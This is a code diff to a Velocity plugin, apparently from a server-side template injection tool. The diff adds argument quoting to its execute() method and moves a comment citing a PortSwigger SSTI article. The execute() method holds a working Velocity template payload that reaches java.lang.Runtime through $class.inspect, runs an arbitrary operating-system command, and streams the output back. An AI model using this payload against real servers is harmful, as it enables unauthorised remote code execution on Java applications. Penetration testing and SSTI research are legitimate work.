@@ -1,7 +1,7 @@
 from core.check import Check
 from utils.loggers import log
 from utils import rand
-import string
+from utils.strings import quote
 
 class Velocity(Check):
 
@@ -19,11 +19,6 @@ class Velocity(Check):
             self.set('language', 'java')
             self.set('engine', 'velocity')
 
-   # I've tested the techniques described in this article
-   # http://blog.portswigger.net/2015/08/server-side-template-injection.html
-   # for it didn't work. Still keeping the check active to cover previous
-   # affected versions.
-
     def detect_exec(self):
 
         expected_rand = str(rand.randint_n(2))
@@ -34,7 +29,11 @@ class Velocity(Check):
 
     def execute(self, command):
 
-        # TODO: quote command
+       # I've tested the techniques described in this article
+       # http://blog.portswigger.net/2015/08/server-side-template-injection.html
+       # for it didn't work. Still keeping the check active to cover previous
+       # affected versions.
+
         return self.inject("""#set($str=$class.inspect("java.lang.String").type)
 #set($chr=$class.inspect("java.lang.Character").type)
 #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("%s"))
@@ -42,4 +41,4 @@ $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
 $str.valueOf($chr.toChars($out.read()))
-#end""" % (command))
+#end""" % (quote(command)))
